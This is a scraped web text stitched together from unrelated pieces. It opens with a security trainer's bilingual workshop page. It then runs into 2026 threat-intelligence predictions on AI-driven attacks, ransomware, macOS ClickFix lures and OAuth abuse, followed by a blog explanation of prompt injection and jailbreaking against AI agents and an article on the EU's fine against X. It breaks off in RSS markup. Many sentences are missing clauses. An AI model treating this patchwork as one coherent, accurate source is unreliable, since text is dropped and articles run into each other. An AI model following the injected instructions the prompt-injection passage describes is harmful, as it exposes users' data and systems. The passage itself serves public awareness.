Ich bin Lauritz Holtmann, selbstständiger IT-Sicherheitsberater und Penetrationstester mit einem Masterabschluss in IT-Sicherheit. Seit mehr als 8 Jahren unterstütze ich Unternehmen dabei, ihre IT-Infrastruktur und Anwendungen sicherer zu gestalten. Meine Leidenschaft für IT-Sicherheit und meine in der Praxis gewonnenen Erfahrungen ermöglichen es mir, komplexe Themen verständlich und anwendungsnah zu vermitteln.

### Mögliche Themenbereiche

Je nach Ihren individuellen Anforderungen und dem Kenntnisstand der Teilnehmenden können die Trainings und Workshops auf verschiedene Themenbereiche zugeschnitten werden. Mögliche Themen sind unter anderem:

#### Sichere Softwareentwicklung

Bereits während meines Studiums der IT-Sicherheit und meiner Tätigkeit als Penetrationstester habe ich mich intensiv mit den Herausforderungen und Best Practices der sicheren Softwareentwicklung beschäftigt. In meinen Workshops und Trainings zur sicheren Softwareentwicklung vermittle ich praxisorientiertes Wissen, um Entwickler:innen und Teams dabei zu unterstützen, Sicherheitsaspekte frühzeitig im Entwicklungsprozess zu berücksichtigen.

Themen in diesem Kontext sind unter anderem:

- Grundlagen der sicheren Softwareentwicklung (SDLC)
- Häufige Sicherheitslücken in Webanwendungen und mobilen Anwendungen (OWASP Top 10, OWASP Mobile Top 10)
- Best Practices zur Vermeidung von Sicherheitslücken in Web- und mobilen Anwendungen
- Praktische Übungen zur Identifikation und Behebung von Sicherheitslücken in Beispielanwendungen

Im Frühjahr 2025 durfte ich Inhalte dieses Workshops im Rahmen des internen “Business Unicorns (BU) Security Champion” Programms der Business Unicorns GmbH präsentieren.

#### SSO und Authentifizierungsverfahren

Nicht erst seit meiner Masterarbeit zum Thema “Single Sign-On Security (Security Analysis of real-life OpenID Connect Implementations)” beschäftige ich mich intensiv mit Authentifizierungsverfahren und deren sicherer Implementierung. In den vergangenen Jahren habe ich im Rahmen zahlreicher Penetrationstests und Bug-Bounty-Programme verschiedenste Authentifizierungsverfahren analysiert und auf Sicherheitslücken untersucht. Hierbei habe ich dutzende Sicherheitslücken identifiziert und im Rahmen von Responsible Disclosure und Bug-Bounty-Programmen den Herstellern gemeldet. Nennenswert sind in diesem Kontext beispielsweise die CVEs CVE-2020-10770 (Keycloak), CVE-2023-6134 (Keycloak) und CVE-2024-21637 (Authentik).

Themenbereiche für einen Workshop in diesem Kontext sind unter anderem:

- Grundlagen von Authentifizierungsverfahren und Single Sign-On (SSO)
- Sicherheitsaspekte und Herausforderungen bei der Implementierung von SSO-Lösungen
- Häufige Sicherheitslücken und Angriffsvektoren bei SSO-Implementierungen (OAuth 2.0, OpenID Connect, SAML)
- Hands-on Übungen zur Analyse und Absicherung von SSO-Implementierungen

Im Dezember 2025 durfte ich einige dieser Inhalte im Rahmen eines internen Workshops eines großen Softwareherstellers präsentieren. Teil des Workshops waren neben theoretischen Inhalten auch praktische Übungen in einem eigens entwickelten Hands-on-Lab zur Analyse und Absicherung von SSO-Implementierungen (NodeJS SP + Keycloak als IdP) sowie Einblicke in reale Sicherheitslücken aus meiner Bug-Bounty-Tätigkeit.

## English Version

I am happy to support you as a freelancer in developing and conducting tailored workshops and training sessions:

In today’s world, _where PoC applications generated through vibe-coding are only a few prompts away_, it is essential for employees to receive regular training to build and maintain awareness of IT security. I offer tailored workshops and training sessions on various IT security topics, delivered either remotely or on-site at your company.

My goal is to provide practical knowledge that can be directly applied in day-to-day work. I place great emphasis on adapting the content to the specific needs and knowledge levels of the participants. Hands-on exercises and interactive elements are an integral part of my training and can be tailored to your requirements.

### Possible Topics

Depending on your individual requirements and the knowledge level of the participants, the training and workshops can be tailored to various topics. Possible topics include:

#### Secure Software Development

During my studies in IT security and my work as a penetration tester, I have intensively dealt with the challenges and best practices of secure software development. In my workshops and training sessions on secure software development, I convey practical knowledge to help developers and IT teams consider security aspects early in the development process.

Topics in this context include:

- Basics of secure software development (SDLC, DevSecOps)
- Common security vulnerabilities in web applications and mobile applications (OWASP Top 10, OWASP Mobile Top 10)
- Best practices for avoiding security vulnerabilities in web and mobile applications
- Practical exercises for identifying and fixing security vulnerabilities in sample applications

In spring 2025, I had the opportunity to present content from this workshop as part of the internal “Business Unicorns (BU) Security Champion” program of Business Unicorns GmbH.

#### SSO and Authentication Methods

Not only since my master’s thesis on Single Sign-On Security (Security Analysis of real-life OpenID Connect Implementations) have I been intensively dealing with authentication methods and their secure implementation. In recent years, I have analyzed and examined various authentication methods for security vulnerabilities as part of numerous penetration tests and bug bounty programs.

Topics in this context include:

- Basics of authentication methods and Single Sign-On (SSO)
- Security aspects and challenges in implementing SSO solutions
- Common security vulnerabilities and attack vectors in SSO implementations (OAuth 2.0, OpenID Connect, SAML)
- Hands-on exercises for analyzing and securing SSO implementations

In December 2025, I had the opportunity to present content from this workshop as part of an internal workshop of a large HR software manufacturer. The workshop included not only theoretical content but also practical exercises in a specially developed hands-on lab for analyzing and securing SSO implementations, as well as insights into real security vulnerabilities from my bug bounty activities (disclosed reports only).

AI has disrupted, and will continue to disrupt, every corner of modern life. In threat intelligence, SentinelLABS has not only recognized this shift but actively pivoted to meet it. At the same time, geopolitical alignments have grown increasingly unstable, with long-standing relationships now less certain than ever.How will these new realities shape enterprises’ ability to anticipate and counter the cyber threats forming on the horizon? Predictions always carry the caveat that the future remains intractably unknowable, but even the unexpected emerges from trajectories already in motion.In this post, . Read on to explore how developments in global strategy, organized cybercrime, and of course, AI could impact us all in the coming year.The Forgiving Internet is OverThe cybersecurity industry has been living on borrowed time, and AI is about to call in the debt.The effects of cyberattacks are not always immediately visible: sometimes they go by entirely unnoticed. That encourages a fundamental cybernetics problem, as there isn’t an obvious causal link between the levers available to defenders and the constraining effects imposed on attackers.That broken loop can create a corrosive perception that what we do doesn’t have meaningful effects, which has allowed our industry to backslide into lowest-investment, compliance-checkbox territory.Meanwhile, the feedback delay entails that just as exploitation can go unnoticed for years, technical debt sits dormant, unnoticed for prolonged stretches.. Today, organizations run edge appliances riddled with a bottomless supply of weaponizable vulnerabilities and n-days, and yet they often come away uncompromised simply because no one has gotten around to them yet.Consider Cl0p’s MOVEit campaign: nearly 2,800 organizations compromised, 96 million individuals’ data exposed and the group was still processing victims more than a year after the initial breach. Cl0p explicitly stated they leaked names slowly to avoid overwhelming their own negotiation capacity. The attack itself was automated, executed over a holiday weekend, largely complete before the patch dropped, but extortion is human work. .The internet’s forgiveness is a function of attacker capacity, and AI is a capacity multiplier. When autonomous agents can probe, validate, and exploit at machine speed, the gap between vulnerable and compromised collapses. Without a countervailing investment in AI-native defense, that asymmetry becomes the defining feature of the landscape.. Scrappy resourcefulness, clear financial incentives, and freedom from procurement cycles guarantee it.The alignment discourse is a distraction. Local models on consumer hardware, unconstrained foreign providers, and enterprise no-retention deployments attest to this. The moment capable computer-use models run locally, guardrails become irrelevant. Anthropic’s recent disclosure of Chinese operators using Claude Code for autonomous intrusions is instructive: one operator hitting thirty targets with minimal human intervention. By their own account, model hallucinations did more to slow the attackers down than any guardrails.If defenders can thank AI for anything, it will be a fundamental reassignment of value, a revamping of capacity, and a necessary reimagining of what’s possible.Feeble attempts to conjure tens of thousands of competent practitioners out of thin air have clearly floundered. Thankfully, getting more bodies isn’t the only way to increase capacity anymore. AI offers exactly that. It invites us to revisit implicit ROI calculations we abandoned long ago. We can now reconsider activities that required human intervention but were deemed too incremental and repetitive to be consequential: processing every document in a breach disclosure, pre-processing logs at scale, reverse engineering tangential codebases to better understand malicious code. These were not impossible tasks; they were tasks we decided not to attempt. That calculus has changed.However, we must be clear-eyed about what we are adopting. These systems are non-deterministic. We are integrating a new form of evaluative power that is commoditized and cheap but also largely outside our control. Their outputs need to be wrangled into predictably acceptable parameters. .What the market is missing (and desperately requires) are organizations that function as step-down transformers: converting raw frontier capability into security outcomes. Frontier labs are racing toward general capability while treating security as one of several potential markets. The result is a gap between what models can theoretically accomplish and what defenders can reliably deploy. Someone must bridge that gap with products and services that translate commoditized evaluative power into deployable autonomy.This means investment in experimentation to redefine security problems in terms of what AI can make tractable, improve, or solve without waiting for archaic vendors to catch up. The threat actor(s) using Claude Code to maximize their operational capability didn’t stumble into competence. They iterated, tested, and created a harness for ready deployment with the human as far out of the loop as possible. Defenders will need equivalent rigor.The opportunity is real and sizable. Seizing it requires that security as a practice becomes AI-native. Organizations that treat AI as another line item will find themselves overwhelmed by an operational tempo they cannot match. Those who internalize it as a fundamental shift, on both sides of the adversarial line, have a chance to redefine the dynamics of the security space. Juan Andres Guerrero-Saade (JAGS), Senior Technical Fellow and VP of Intelligence and Security Research, SentinelLABSHemispheric Crossfire | US–Venezuela Cyber Operations Drag in the Big ThreeAs of late 2025, Venezuela has already shifted from a chronic crisis to a genuine flashpoint. U.S. carrier groups and expanded maritime operations in the Caribbean, public talk of “closing” Venezuelan airspace, and speculation about regime‑change scenarios have raised the temperature dramatically. Caracas, for its part, is signaling a willingness to fight a long guerrilla struggle and “anarchize” the environment if the U.S. moves militarily. At the same time, Venezuela has deepened its alignment with Russia, Iran, and China, explicitly seeking security guarantees, capital, and military assistance from all three.In such an environment, a realistic 2026 development is . This doesn’t mean Hollywood‑style leaks of every covert program; it looks more like a mosaic of glimpses: A social media platform announces a takedown of coordinated inauthentic networks seeding narratives aimed at Venezuelan military factions and diaspora communities; A contractor leak reveals tooling used to profile Venezuelan officers, union leaders, and local elites; A regional report connects seemingly independent media outlets and meme sources back to U.S.-linked funding and infrastructure, blurring the line between strategic communications and covert influence.None of this is unprecedented. Great powers all play in this space, but the political salience of Venezuela today means the blowback will be sharper and more public than usual.That exposure offers raw material for counter‑narratives and operations by Caracas’ backers. Russia is already running well‑funded Spanish‑language disinformation and propaganda campaigns across Latin America, often in coordination with partner state media, with a long‑standing focus on undermining U.S. standing in the region. Iran has used Venezuela as a beachhead for sanctions evasion, proxy networks, and anti‑U.S. activity, including leveraging IRGC and Hezbollah-linked structures to expand its reach in the hemisphere. China, meanwhile, is quietly consolidating intelligence collection capabilities via regional ground stations, telecom infrastructure, and proximity to key undersea cables, assets Western analysts already flag as potential platforms for surveillance of U.S. communications..Russian and Venezuela‑aligned influence networks will likely amplify any evidence of U.S. IO/espionage, real, exaggerated, or fabricated, into Spanish and English‑language campaigns targeting U.S. domestic audiences, Latin American publics, and the Venezuelan diaspora.Iranian‑linked actors can be expected to piggyback on the crisis to probe U.S. critical infrastructure and financial networks under an “Axis of Authoritarianism” narrative, using the Venezuela storyline to justify escalation in cyber operations they were running for other reasons anyway.Chinese‑linked capabilities are more likely to manifest as intensified collection and mapping, SIGINT on U.S. deployments, diplomatic traffic, and commercial flows, rather than loud influence campaigns, but that data will feed the same broader alignment.. A Venezuelan crisis becomes the pretext that ties together Russian, Iranian, Chinese, and local pro‑regime operators into loosely synchronized campaigns: hack‑and‑leak operations targeting U.S. policy debates; cross‑platform disinformation linking Venezuela to border, drugs, and migration narratives; the probing of U.S. energy, maritime, and telecom infrastructure under the cover of regional tension.Expect to see Spanish‑language infrastructure and personas show up in incidents that ultimately impact U.S. and European networks and more clusters where attribution threads run through Caracas and Moscow/Tehran/Beijing at the same time. The organizations most likely to feel this first are those at the seam lines: energy, logistics, telecom, diaspora media, and NGOs with one foot in the U.S. and one in the region.Tom Hegel, Distinguished Threat Researcher, SentinelLABSChina’s Fifteenth Five Year Plan.After Xi came into power in 2013, he set about issuing development goals for science and technology in China not seen since the leadership of Mao Zedong. The most notable, Made in China 2025 was released two years later in 2015. After American opprobrium reached its peak in the first Trump administration, China slowly withdrew MIC2025 from the limelight. American attention to the strategy led to significant collection difficulties for the PRC as the US FBI and other government agencies prioritized defense of targeted technologies in the private sector and at US research institutions, like universities.In 2021, the PRC released publicly only a vague outline of the Party’s Medium- to Long-Term Development Plan for Scientific and Technological Innovation, which set innovation goals for 2025, 2030, and 2035. Foreign attention to MIC2025 led the Party to mark the full content of the plan as “internal circulation only.”. The PRC central government will release the official 15th FYP in 2025, and will delegate much of the details about achieving its objectives to government ministries. Ministries will release their more-detailed version of the 15th FYP in late 2025 or early 2026. Those documents create a political demand signal for provincial governments and bureaucracies to work towards realizing.Contracted hackers looking to pilfer western technology and sell it to the highest bidder in China will consult those documents to identify the technologies their customers are likely to pay good money for. If your industry is on the list of targeted technologies, buckle up.Dakota Cary, Senior Security Advisory ConsultantOrganized Cybercrime | More Integrated, Streamlined & AggressiveRansomware and infostealers are now commodity features. We’ve blown past this milestone in the last couple of years. Consider ransomware and data exfiltration as givens in the event of any opportunistic breach. While the days of the ‘big brand’ extortion operations are waning, we are seeing more smaller, organized groups offering à la carte services, including ransomware, but ultimately, this is just another feature available in ‘run of the mill malware’.The blending of infostealer and ransomware-style features into more swiss-army knife tools and services will attract a broader set of criminals, a natural evolution already underway, given the heavy reliance of modern attacks on the infostealer logs ecosystem.This also overlaps with the trend towards more ‘Cartel-style’ operations or ‘alliances’ which consolidate disparate malicious services into more all-encompassing “MaaS” offerings.Ransomware & Initial Access BrokersAs these cartels and service ecosystems solidify, the relationships that underpin initial access are tightening as well. Ransomware groups continue to work closely with IABs (Initial Access Brokers), with an increasing number of threat actors publicly and aggressively attempting to recruit ‘trusted’ IABs. Groups like Sicarii advertise special advantages to others willing to partner with them.Additionally, we can expect to see IABs starting to offer more targeted bundles consisting of curated credential sets. For example, IABs will start offering ‘chains’ based on cumulative sets of related credentials (chain of VPN->O365->Cloud Console access for a target). There are some specializing in this now, but we expect this to become more mainstream as the infostealer log ecosystem, which feeds many IABs, continues to explode.Increasing Attacks Will Offer Defenders Fewer IOCs and ArtifactsThere are some interesting micro trends within these smaller, more obscure, operations. One such trend is the omission of ransom notes and other noisy filesystem artifacts, and threat actors moving towards more direct follow-ups via emails and phone calls to initiate communications.We have seen groups like “Penguin Cartel’ operate in this way, and we expect adversaries to increasingly embrace these alternate methods of first notification in extortive attacks.Businesses Will Keep Losing Data, Encryption Not RequiredThis operational “quieting” aligns with another growing trend: attackers no longer need to encrypt data to profit from it. This is far from new, but it is increasing. More crimeware actors eschew encryption entirely, opting to extort victims to prevent release of the exfiltrated data. Groups like Kairos and WorldLeaks are current examples of this model.More Automation, More UpscalingWhile the “AI-revolution” has yet to fully transform the downstream atomic artifacts of crimeware, cybercriminals are taking advantage of various automation options, using AI to augment and scale-up their output.An increasing number of actors are leveraging AI agents, Telegram Bots and similar features both to automate discovery and sales of their product and C2 activities. This has long since been a practice in the traditional infostealer community, but we are seeing an uptick of this across the crimeware landscape.Pressure Escalates TacticsThreat actors are continuing to apply real-world violence (VaaS) to ensure their profitability. Naming-and-shaming via data leak sites will remain a permanent feature of the landscape, but we will see further pressure being applied to business clients, customers, family members and entities that are peripheral to the victim. One common manifestation of this is swatting groups being called upon to apply pressure to financial crime victims.Additionally, threat actors will continue to leverage regulatory and compliance laws to apply pressure and time leak announcements around critical events such as earnings calls or M&A negotiations.Jim Walter, Senior Threat Researcher, SentinelLABSLiving Off Apple’s Land | Latent Powers and Stolen TrustLast year, we noted how threat actors were making hay abusing AppleScript’s spoof-friendly ability to create password dialog boxes to gain elevated privileges, but as many unfortunate victims have been finding out this year, that’s far from all AppleScript is good for.ClickFix is the new social-engineering kid-on-the-block for every stripe of threat actor from nation state APTs to opportunistic cryptowallet-stealing cybercriminals. Dropping a simple two-line AppleScript that opens an innocuous webpage, perhaps a support portal for some legit technology, with up to 10000 blank lines ending with a few malicious lines of code is a ridiculously simple but effective method of social engineering.2026 will see the continuation of both techniques. However, as old as Python and as powerful as PowerShell, .We are just beginning to see the first signs of adversaries making use of AppleScript’s Objective-C (AS-ObjC) bridge — a wonderful technology that brings the power of Apple’s Foundation and AppKit frameworks, including NSWorkspace, to simple AppleScripts. In the past, we’ve seen AS-ObjC’s newer cousin JXA (JavaScript for Automation) gain traction in red-teaming tools like Apfell; it’s a small conceptual leap from there to the (arguably) easier world of AppleScript Objective-C.That opens up a whole new world of in-memory scripting power that otherwise usually requires a compiled binary and readily-detectable file writes. Will we see threat actors lean into this old, built-in, not-widely known, yet incredibly powerful way of programming Mac computers? If you’re a threat actor, it’s a Living-off-the-Land technology dream come true. If you’re a defender, it’d be smart to start thinking about what that looks like from a telemetry point-of-view in 2026. And while we’re on the topic of powerful, Apple Framework-enhanced scripting languages, Swift scripting is a thing worth keeping in mind, too.On macOS, ClickFix was a necessity-is-the-mother-of-invention response to Apple’s plugging of the Gatekeeper workaround. However, you don’t need a bypass to Apple’s increasingly strict code signing and notarization rules if your malware is signed with a valid developer ID., and it’s only a matter of time before we see these abused by more malware authors. Temporary they may be, as Apple is quick to nix such accounts once identified, but even a short-lived campaign can do a lot of damage against the right targets.The lesson for defenders is not to treat validly code signed executables as some kind of exception to detection rules. Signed code tells a defender little more than that it passed Apple’s automated checks and that the code has a name attached to it. In the case of malware, that’s almost certainly not the name of a threat actor.Phil Stokes, macOS Research Engineer, SentinelLABSThe AI Reckoning | Consolidation, Censorship, and Economic FalloutSpecialized Models Will Belong to Those Who Can Make Them.The generic “copilot for X” and “AI workspace” products that dominated pitch decks in 2023–2024 will be reborn as bloodless, checkbox features inside Microsoft 365, Google Workspace, and other large platforms. The quality will be worse than the specialized startups they replace, but that won’t matter because they’ll be easy to buy on an enterprise contract, come bundled with existing tools, and be turned on with a toggle in an admin console.The result will look like a mass extinction. Valuations will implode and the easy money will evaporate. The tech influencer class on X will still push the “996 grindset mentality” even as the few humbled survivors of the crash pivot from “owning the category” to cutting costs and delivering durable value to a smaller, demanding set of customers.. These smaller entrants will sit in narrow, high-stakes domains: cybersecurity, law, finance, industrial control, biotech…In those areas, the winners will be teams that have quietly built a repeatable data and training pipeline, have access to proprietary datasets, and can deploy smaller models that are integrated into specific workflows, regulations, and hardware.Advances in training efficiency, data curation, and model compression will be among the most valuable pieces of this puzzle, and they will increasingly move out of public view. Labs will publish less, national-security programs will classify more, and a handful of specialized shops will jealously guard their pipelines.The Bubble Pops in a Poisoned RealityAI is unpopular as an idea. For most consumers it means glitchy chatbots, over-eager automation at work, auto-generated spam, and marketing departments screaming about “AI-powered” everything. The underlying capabilities are real, but the experience is mostly annoyance, precarity, and a strong sense that someone else is getting rich off a thing that is happening to you, not for you.On top of that resentment, . Capital has flooded into anything AI: driving valuations, headcount, and infrastructure spending far beyond what current use-cases justify. In the last year, large tech companies have fired workers while bragging about “AI efficiencies,” even when they’re mostly just undoing years of over-hiring.The important prediction isn’t “a bubble exists”; it’s . Within the next year we should expect a dot-com–scale drawdown in AI equity and private valuations: a broad repricing of pure-play “AI companies,” at least one of today’s marquee AI darlings valued at less than a third of its peak, and a long tail of late-stage startups ruthlessly zeroed-out. The hyperscalers will survive because AI is one line item inside a much larger machine; most everyone else will discover that they built a feature, not a business.The crash will happen in a reality already saturated with synthetic content. In the scramble to justify their spend, organizations are using models to flood every channel with low-cost output: SEO sludge, autogenerated news, endless pitches, synthetic “user reviews,” fake engagement. Previously trusted sites and platforms are already quietly tilting from human-written to machine-written material because the unit economics are irresistible. The problem is they are using last decade’s metrics: what is the actual economic value of Daily Active Users when the content they are consuming is slop that nobody can monopolize?As the synthetic layer of our online experience deepens, models are trained and retrained on their own exhaust and on rival models’ curated “knowledge bases”, wiki-like sites and reference corpora that are themselves partially or wholly machine-written. Systems start to treat these partisan or synthetic compilations as “ground truth” simply because they look like structured authority.The targeted threat of “model poisoning” becomes the inescapable threat of “reality poisoning” and the line between what actually happened and what the machine inferred as plausible will vanish.This increasingly synthetic environment directly undermines the business case that justified the bubble in the first place. Search gets worse, watered down, and commoditized. Feeds become vacuum sealed bubbles where nothing breaks containment. Analytics get noisier and less reliable. Conversion rates slip as users learn to distrust what they see on screens. Enterprises that bought AI to “supercharge knowledge work” find that their internal knowledge bases are now clogged with plausible nonsense that’s harder and harder to audit. The marginal ROI on yet another AI integration rapidly decays.. “AI took my job and ruined the internet.” The actual big picture may be composed of macro economics, overcapacity, and misallocated capital, but the emotional truth will be that AI made jobs less secure, the information environment less trustworthy, and the daily experience of technology spammy and brittle.In the aftermath, the models will remain, the infrastructure will remain, and the incumbents will survive by using them where they produce actual value. What won’t survive will be broad-based cultural, political, and financial enthusiasm.In the next year, we will end up with powerful systems embedded deep in a few dominant platforms, operating in a permanently contaminated data environment, surrounded by a public that no longer believes the marketing and cannot trust the outputs.Dual-Use Will Eat Alignment and Turn Into Regional Censorship. Questions about “U.S. vs. China vs. everyone else” will move out of policy think-tanks and into mainstream geopolitics. Behind closed doors, frontier systems will be evaluated less as “products” and more as strategic infrastructure: tools that can rewrite the balance of cyber offense, intelligence gathering, and information operations both at home and abroad.In this world, statements of “public model alignment” will become less important. The loud, visible debates about fairness, bias, and “responsible AI” will continue, but the most consequential work on offensive AI capabilities will move into secure facilities, export-controlled supply chains, and gray markets. The question will shift from “Is this system aligned with human values?” to “Is this system aligned with our national interests?”Because AI systems are inherently dual-use, offensive capabilities and control affordances will be developed in parallel. The same model that politely refuses to discuss certain topics in a consumer chat interface will have close cousins tuned for intrusion discovery, vulnerability triage, targeted influence, and automated exploitation. Many of those capabilities will originate in state-backed programs, but they won’t stay there. They’ll diffuse into law enforcement, domestic security services, and private contractors, where they will be applied to civilian populations as instruments of soft control and, when desired, hard power.That logic will leak out into the consumer layer as regionalized safety controls. As these technologies scale, they will increasingly mirror existing patterns of information control. Providers will ship different rule-sets and behaviors by jurisdiction, the way streaming platforms already fragment their catalogs country by country. Providers will claim that this represents “localization” efforts — where differences in language and cultural references are updated for the target population. What they are really localizing is the range of thinkable thoughts within a language model.Whatever their marketing stance on “neutrality” or aversion to particular ideological labels, major providers will have very strong incentives to align their models with local statutes, regulatory guidance, and informal political red lines. If a given government can threaten licenses, data-center permits, key executives, or revenue streams, the “alignment layer” becomes one more lever for the powerful. Governments will jump at the opportunity to tweak refusal patterns, soften the model’s treatment of this history, or remove guidance that might make protests more effective.Over time, legislators, regulators, authoritarian regimes, and litigators will get a much sharper sense of where these levers sit inside these systems: how content filters work, what knobs exist for toxicity, radicalization, and persuasion, or how model-delivered advice translates into real-world actions. The volume and specificity of legal and policy demands on these knobs will expand accordingly.Engineering teams at these companies will spend less time debating abstract philosophical framings and more time implementing tightly scoped, jurisdiction-specific constraints designed by lawyers and national security officials.The result will be a stratified ecosystem: that are heavily constrained will become the systems most people will interact with day to day., derived from the same or larger bases but deployed inside governments, defense contractors, and domestic security agencies, will be used to profile, predict and shape human behavior at scale. will be leaked, stolen, or quietly licensed and recirculate similar capabilities into criminal markets and non-state actors.In all three layers, “alignment” will be eaten by dual-use. The systems will be “aligned” to institutional goals, not to a shared, global notion of human flourishing. The public will experience this as an explosion of region-specific censorship and weirdly divergent realities between models that reflect different value systems.In short, the coming wave of LLM censorship by major U.S. and allied companies is the civilian-facing expression of a deeper shift. . Alignment becomes a branch of national security and regulatory compliance, and the map of model behavior starts to trace the borders of political power rather than the contours of an egalitarian reality.Gabriel Bernadett-Shapiro, Distinguished AI Research Scientist, SentinelLABSZero or No Trust | Interconnected Services Lead to Increasingly Devastating IntrusionsZero Trust Architecture networks have been increasingly ubiquitous over the last five years, with the pandemic driving many organizations to rapidly adopt and implement related technologies to support the sudden uptick in remote work. Threat actors were slower to adapt through 2020-2022, as there were plenty of targets who had not jumped on the ZTA bandwagon. Early adopters targeting these environments made headlines by compromising often tech-forward organizations, a far cry from the companies typically in the news for huge ransomware attacks against legacy networks.In 2025, there were several campaigns where actors targeted highly interconnected environments by focusing on identity providers. The ShinyHunters campaign abusing OAuth relationships in certain Salesforce user environments is a notable example: granting OAuth access to the Data Loader app enabled the attackers to access the victim environment and exfiltrate data using a Salesforce tool intended to do exactly that. Similarly, in August 2025 attackers abused the Salesloft Drift application to hijack OAuth rights to harvest cloud service and SaaS credentials from the targeted environment.There is huge potential for actors who identify improperly configured or abandoned OAuth-enabled applications. This was demonstrated in 2024 when Midnight Blizzard struck gold by discovering a legacy application in Microsoft’s test environment that enabled high-privileged access to corporate environments. For several years, skilled cloud attackers have been working on tools that map both resources and OAuth relationships in target environments.While gaining access to such a high value environment as a major cloud service and operating system provider may not be feasible for most actors, .Based on the increased prevalence of Zero Trust environments, an increased attacker focus and understanding of SaaS identity providers, and the rise in sophistication of tools used to identify relationships between identities and assets in organizations’ environments, we believe there is a significant risk for attacks that misuse the new forms of “trust” used to authenticate applications within environments.A potential evolution we may see in 2026 is tooling that not only targets one SaaS application and its downstream connections, but likely has some degree of automation or evaluation through agentic AI analysis to continue performing more phases of intrusion based on findings from the previous phase.Alex Delamotte, Senior Threat Researcher, SentinelLABSAI-Driven Threats | Blurred Attribution and the DPRK WildcardThe use of AI by adversaries will likely manifest in two ways outside of the ongoing discourse. The vast majority of attackers’ use of AI to date has been around driving greater efficiency and automating existing parts of their intrusion lifecycle. The intelligence assessments to date tend to skew towards technical improvements and capabilities.If we look back on past assessments of emerging technologies — and let’s be honest, AI is without a doubt an emerging technology — two unexpected things tend to happen.First, threat actors’ use of new technologies almost inevitably blurs existing assessment lines, typically around tradecraft and attribution. If we apply this to AI, . In particular, AI’s ability to provide language capabilities will bring low-level cybercriminals into the realm of government programs with full linguistic capabilities. This was an incredibly important capability distinction that is likely to end in the coming year solely because of AI.. DPRK cyber activities have previously caught intelligence organizations off-guard multiple times. Examples range from destructive attacks geared towards stopping a movie release through the current IT workers situation.Additionally, AI has proven highly useful and effective to DPRK efforts, again the IT workers are a great example. When we pair these realities with the vast amount of illicit revenue generated by DPRK’s efforts at stealing cryptocurrency, we see an interesting situation emerging.We have a cyber effort known to produce surprises, actively leveraging AI in a large and also previously unforeseen manner, and producing large amounts of revenue for the regime through cyber actions, both cryptocurrency theft and IT workers payments.There is a high likelihood some level of these illicit gains will be reinvested into the DPRK cyber programs to increase their scope, scale, and impact–programs that are already actively pushing the bounds of AI use.

For example, if you tried to tell an agent to explain how to produce anthrax spores at scale, guardrails would ideally detect that request as undesirable and refuse to acknowledge it.Getting an AI to go outside those boundaries is often referred to as jailbreaking.  are the safety systems that try to keep AI models from saying or doing harmful things.  is when someone crafts one or more prompts to get around those safety systems and make the model do what it’s not supposed to do.  is a specific way of doing that: An attacker hides their own instructions inside user input or external content, so the model follows those hidden instructions instead of the original guardrails.The danger grows when Large Language Models (LLMs), like ChatGPT, Claude or Gemini, stop being chatbots in a box and start acting as “autonomous agents” that can move money, read email, or change settings. If a model is wired into a bank’s internal tools, HR systems, or developer pipelines, a successful prompt injection stops being an embarrassing answer and becomes a potential data breach or fraud incident.The temptation to frame prompt injection as “SQL injection for AI” is understandable. Both are injection attacks that smuggle harmful instructions into something that should have been safe. But the NCSC stresses that this comparison is dangerous if it leads teams to assume that a similar one‑shot fix is around the corner.The comparison to SQL injection attacks alone was enough to make me nervous. The first documented SQL injection exploit was in 1998 by cybersecurity researcher Jeff Forristal, and we still see them today, 27 years later. SQL injection became manageable because developers could draw a firm line between commands and untrusted input, and then enforce that line with libraries and frameworks. With LLMs, that line simply does not exist inside the model: Every token is fair game for interpretation as an instruction. That is why the NCSC believes prompt injection may never be totally mitigated and could drive a wave of data breaches as more systems plug LLMs into sensitive back‑ends.Does this mean we have set up our AI models wrong? Maybe. Under the hood of an LLM, there’s no distinction made between data or instructions; it simply predicts the most likely next token from the text so far. This can lead to “confused deputy attacks.”The NCSC warns that as more organizations bolt generative AI onto existing applications without designing for prompt injection from the start, the industry could see a surge of incidents similar to the SQL injection‑driven breaches of 10—15 years ago. Possibly even worse, because the possible failure modes are uncharted territory for now.The NCSC provides advice for developers to reduce the risks of prompt injection. But how can we, as users, stay safe?Take advice provided by AI agents with a grain of salt. Double-check what they’re telling you, especially when it’s important.Only connect AI assistants to the minimum data and systems they truly need, and keep anything that would be catastrophic to lose out of their control.Treat AI‑driven workflows like any other exposed surface and log interactions so unusual behavior can be spotted and investigated.We don’t just report on threats—we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

X touted this feature, first introduced by Musk when he bought Twitter in 2022, as a way to verify your identity on X. However, the Commission accused it of failing to actually verify users. It said:“On X, anyone can pay to obtain the ‘verified’ status without the company meaningfully verifying who is behind the account, making it difficult for users to judge the authenticity of accounts and content they engage with.” The company also blocked researchers from accessing its public data, the Commission complained, arguing that it undermined research into systemic risks in the EU.Finally, the fine covers a lack of transparency around X’s advertising records. Its advertising repository doesn’t support the DSA’s standards, the Commission said, accusing it of lacking critical information such as advertising topic and content.This makes it more difficult for researchers and the public to evaluate potential risks in online advertising according to the Commission.Before Musk took over Twitter and renamed it to X, the company would independently verify select accounts using information including institutional email addresses to prove the owners’ identities. Today, you can get a blue checkmark that says you’re verified for $8 per month if you have an account on X that has been active for 30 days and can prove you own your phone number. X killed off the old verification system, with its authentic, notable, and active requirement, on April 1, 2023.An explosion in imposter accountsThe tricky thing about weaker verification measures is that people can abuse them. Within days of Musk announcing the new blue checkmark verifications, someone registered a fake account for pharmaceutical company Eli Lilly and tweeted “insulin is free now”, tanking the stock over 4%.Other impersonators verifying fake accounts at the time targeted Tesla, Trump, and Tony Blair, among others.Weak verification measures are especially dangerous in an era where fake accounts are rife. Many people have fallen victim to fake social media accounts that scammers set up to impersonate legitimate brands’ customer support.This isn’t the social media company’s first tussle with regulators. In May 2022, before Musk bought it, Twitter settled with the FTC and DoJ for $150 million over allegations that it used peoples’ non-public security numbers for targeted advertising.X has 60 working days to address the checkmark violations and 90 days for advertising and researcher access, although given Musk’s previous commentary we wouldn’t be surprised to see him take the EU to court.Meanwhile, the core problem persists: anyone can still buy a ‘verified’ checkmark from X with extremely weak verification. So if anyone with a blue checkmark contacts you on the platform, don’t take their authenticity for granted.We don’t just report on threats – we help protect your social media]]></content:encoded></item><item><title>South Korea police raid e-commerce giant Coupang over data leak; govt schedules 